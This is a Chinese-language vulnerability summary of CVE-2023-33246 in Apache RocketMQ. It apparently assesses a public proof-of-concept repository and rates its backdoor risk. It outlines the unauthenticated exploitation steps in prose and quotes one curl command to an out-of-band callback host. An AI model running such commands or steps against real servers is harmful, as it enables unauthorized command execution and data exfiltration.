## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)